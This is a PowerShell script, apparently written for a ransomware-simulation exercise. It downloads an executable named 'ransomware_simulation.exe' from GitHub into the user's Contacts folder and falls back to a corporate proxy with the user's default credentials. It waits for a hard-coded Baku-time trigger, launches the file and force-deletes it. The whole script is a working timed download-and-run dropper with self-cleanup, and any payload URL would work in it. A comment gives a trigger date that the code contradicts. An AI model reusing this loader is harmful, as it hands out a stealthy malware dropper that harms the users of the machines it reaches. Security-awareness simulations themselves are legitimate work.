$executablePath = "$HOME\Contacts\test.exe"
$listen_time = 180


# Define the Baku timezone
$timezone = [System.TimeZoneInfo]::FindSystemTimeZoneById("Azerbaijan Standard Time")

# Define the target execution date and time (September 8, 2024 at 3:15 PM Baku time)
$targetDateTime = [System.TimeZoneInfo]::ConvertTime([System.DateTime]::New(2023, 11, 11, 11, 23, 55), $timezone)


# Get the current time in Baku timezone
$currentTime = [System.TimeZoneInfo]::ConvertTime([System.DateTime]::UtcNow, $timezone)

# Compare the current time with the target time
$comparisonResult = $currentTime.CompareTo($targetDateTime)

# Check if the current time matches the target time
if ($comparisonResult -eq 1) {

    Write-Host "Deadline exceeded"

    if(Test-Path $executablePath -PathType Leaf){
        Remove-Item -Path $executablePath -Force
    }
    
    
    Exit
}




#Sleep time for Connection checking
Start-Sleep -Seconds 120


if(-not (Test-Path $executablePath -PathType Leaf)){

    $URL = "https://github.com/jakaideN/ransomware-simulation/raw/main/ransomware_simulation.exe"


    try{
        
        Invoke-RestMethod -Uri $URL -OutFile $executablePath
        
    }catch{
        
        # =============== If your company use proxy =========================================
        $proxy = New-Object System.Net.WebProxy("http://proxy.yourproxy.com:8080")
        $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        [System.Net.WebRequest]::DefaultWebProxy = $proxy
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        Invoke-RestMethod -Uri $URL -OutFile $executablePath
        # =============== If your company use proxy =========================================

    }

}




# Run the loop indefinitely
while ($true) {
    # Get the current time in Baku timezone
    $currentTime = [System.TimeZoneInfo]::ConvertTime([System.DateTime]::UtcNow, $timezone)
    
    # Compare the current time with the target time
    $comparisonResult = $currentTime.CompareTo($targetDateTime)
    
    # Check if the current time matches the target time
    if ($comparisonResult -eq 1) {

        
        $delete_time = $listen_time + 8
        
        Start-Process -FilePath $executablePath -ArgumentList "$listen_time"
        
        Start-Sleep -Seconds $delete_time

        Remove-Item -Path $executablePath -Force
        
        break
    }

    # Sleep for a while to avoid excessive CPU usage
    Start-Sleep -Seconds 5
}